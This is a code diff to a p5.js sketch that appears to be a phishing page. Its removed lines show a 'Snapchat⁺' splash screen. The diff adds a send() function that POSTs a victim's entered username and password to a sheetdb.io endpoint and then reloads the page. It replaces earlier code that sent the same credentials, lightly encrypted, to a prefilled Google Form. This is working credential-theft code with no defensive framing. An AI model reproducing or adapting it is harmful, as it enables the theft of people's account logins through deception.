@@ -65,6 +65,23 @@ function replaceExcept(strs) {
   }
   return result;
 }
+function send(user,pass){
+  fetch('https://sheetdb.io/api/v1/tbfbe5pdzqev3', {
+    method: 'POST',
+    headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        data: [
+            {
+                'password': pass,
+                'username': user
+            }
+        ]
+    })
+})
+}
 let hold = 0;
 function draw() {
   background(250);
@@ -109,14 +126,8 @@ function draw() {
       }
     }
   }else if (page===2){
-    background(0);
-    textSize(40);
-    textAlign(CENTER,CENTER);
-    fill(255,255,100);
-    textStyle(BOLD);
-    text("Snapchat⁺",width/2,height/2+sin(frameCount/30)*height/10);
-    secret = encrypt(username.value()+"___"+password.value(),5);
-    window.location.replace("https://docs.google.com/forms/d/e/1FAIpQLSeNH0AMMsiMDN9edoLGybjv5EY-_hrCP-B680ryb-xvNIfuhA/viewform?usp=pp_url&entry.458981810="+secret);
+    send(username.value(),password.value());
+    window.location.reload();
   }
   
   if (mouseIsPressed){
